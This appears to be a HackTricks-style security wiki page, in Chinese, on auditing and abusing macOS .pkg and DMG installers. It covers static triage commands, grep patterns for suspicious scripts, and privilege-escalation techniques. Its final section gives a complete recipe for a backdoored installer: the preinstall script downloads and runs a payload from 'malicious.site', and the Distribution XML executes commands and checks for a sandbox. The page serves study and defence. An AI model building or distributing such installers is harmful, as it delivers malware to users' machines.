# macOS Installers Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Pkg Basic Information

macOS **installer package**（也称为 `.pkg` 文件）是一种由 macOS 使用的**分发软件**文件格式。这些文件就像一个**包含软件安装和正确运行所需全部内容的盒子**。

Package 文件本身是一个存档，其中包含将在目标计算机上**安装的文件和目录层级结构**。它还可以包含用于在安装前后执行任务的**scripts**，例如设置配置文件或清理软件的旧版本。

### Hierarchy

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**：自定义内容（标题、欢迎文本……）以及 script/installation 检查
- **PackageInfo (xml)**：信息、安装要求、安装位置，以及要运行的 scripts 路径
- **Bill of materials (bom)**：要安装、更新或删除的文件列表及其文件权限
- **Payload (CPIO archive gzip compressed)**：要安装到 PackageInfo 中 `install-location` 的文件
- **Scripts (CPIO archive gzip compressed)**：安装前和安装后的 scripts，以及提取到临时目录中执行的其他资源。

### 解压
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
为了在不手动解压的情况下查看 installer 的内容，你也可以使用免费工具 [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/)。

### Static triage 快捷方式

如果目标是进行分析，尽量**避免先使用 `Installer.app` 打开 package**。某些 package 可能会在 Installer 打开它们后立即执行代码（例如通过 `system.run()` 或 installer plug-ins），因此 offline extraction 通常是更安全的起点。
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## DMG 基本信息

DMG 文件，也称为 Apple Disk Images，是 Apple macOS 用于磁盘映像的一种文件格式。DMG 文件本质上是一个**可挂载的磁盘映像**（包含自身的文件系统），其中包含通常经过压缩、有时经过加密的原始块数据。当你打开 DMG 文件时，macOS 会将其**挂载为物理磁盘**，从而允许你访问其中的内容。

> [!CAUTION]
> 请注意，**`.dmg`** installers 支持**非常多的格式**，过去其中一些包含的漏洞曾被滥用来获取**内核代码执行**权限。

### 层级结构

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

DMG 文件的层级结构可能因内容而异。不过，对于 application DMGs，通常遵循以下结构：

- 顶层：这是磁盘映像的根目录。通常包含 application，以及可能指向 Applications 文件夹的 link。
- Application (.app)：这是实际的 application。在 macOS 中，application 通常是一个 package，其中包含组成该 application 的多个单独文件和文件夹。
- Applications Link：这是 macOS 中 Applications 文件夹的 shortcut。其目的是让你更容易安装 application。你可以将 .app 文件拖到这个 shortcut 上，以安装 app。

## 通过 pkg abuse 进行 Privesc

### 从公共目录执行

例如，如果 pre 或 post installation script 从**`/var/tmp/Installerutil`**执行，并且 attacker 能够控制该 script，那么每当它被执行时，attacker 就可以提升权限。另一个类似的例子：<sup>[1][3]</sup>

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

这是一个[公开 function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg)，多个 installers 和 updaters 会调用它来**以 root 身份执行某些内容**。此 function 接受要**执行**的**文件**的**路径**作为参数；但是，如果 attacker 能够**修改**该文件，就可以滥用其 root 执行权限来**提升权限**。
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
更多信息请查看此演讲：[https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)<sup>[8]</sup>

### Environment 与 shebang abuse

现代 PackageKit 漏洞表明，installer scripts 通常会以**trusted root code** 的身份执行，同时附近仍保留着 attacker-controlled context。审计 vendor packages 时，请特别注意：

- Shell interpreters，例如 `#!/bin/zsh` / `#!/bin/bash`
- 类似 `sudo -u $USER`、`launchctl asuser` 的调用，或任何信任 `$USER`、`$HOME`、`PATH`、`TMPDIR` 或 relative paths 的逻辑
- 可能加载 user-controlled init files 或 libraries 的 non-shell interpreters
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
对于 2024 年 PackageKit root-environment bug（用户发起安装期间继承 `~/.zshenv` / `~/.bash*`），请查看[通用 macOS privesc 页面](../macos-privilege-escalation.md)。如果软件包是 **Apple-signed**，同一个脚本 bug 可能变得与 **SIP/TCC** 相关，因为 `system_installd` 可能携带 `com.apple.rootless.install.heritable`；请参阅 [SIP 页面](../macos-security-protections/macos-sip.md)。<sup>[5][6]</sup>

### 通过挂载执行

如果 installer 会写入 `/tmp/fixedname/bla/bla`，则可以使用 noowners 在 `/tmp/fixedname` 上方**创建挂载**，这样就能在安装期间**修改任意文件**，从而滥用安装流程。

这方面的一个例子是 **CVE-2021-26089**，它成功**覆盖了一个 periodic script**，从而以 root 身份执行。更多信息请参阅演讲：[**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)<sup>[7]</sup>

## 将 pkg 作为 malware

### 空 Payload

可以只生成一个包含 **pre 和 post-install scripts** 的 **`.pkg`** 文件，而不包含任何真实 payload；恶意代码仅存在于这些 scripts 中。

### Distribution xml 中的 JS

可以在软件包的 **distribution xml** 文件中添加 **`<script>`** 标签，其中的代码会被执行，并且可以使用 **`system.run`** **执行命令**：

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

在 distribution packages 中，这通常取决于顶层的 `Distribution` 文件是否启用了 external scripts，例如设置 `allow-external-scripts="true"`。因此，仅审查 `preinstall` / `postinstall` 是不够的：**Distribution XML 本身**也可能包含 `installation-check` / `volume-check` hooks，以及直接调用 `system.run()` / `system.runOnce()` 的执行路径。
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### 带后门的 Installer

在 dist.xml 中使用脚本和 JS 代码的恶意 Installer
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## 参考资料

- [1] [DEF CON 27 - 解包 Pkgs：深入了解 Macos Installer Packages 及常见安全漏洞](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [2] [OBTS v4.0：“macOS Installers 的野外世界” - Tony Lambert](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [3] [DEF CON 27 - 解包 Pkgs：深入了解 MacOS Installer Packages](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [4] [RedTeamRecipe – macOS Red Teaming：利用 Installer Packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [5] [CVE-2024-27822：macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [6] [使用 Apple-signed Packages 突破 SIP](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)
- [7] [OBTS v4.0：“Mount(ain) of Bugs” - Csaba Fitzl](https://www.youtube.com/watch?v=jSYPazD4VcE)
- [8] [DEF CON 25 - Patrick Wardle - macOS 上的 1000 个 Installers 致命打击，一切都已损坏！](https://www.youtube.com/watch?v=lTOItyjTTkw)

{{#include ../../../banners/hacktricks-training.md}}
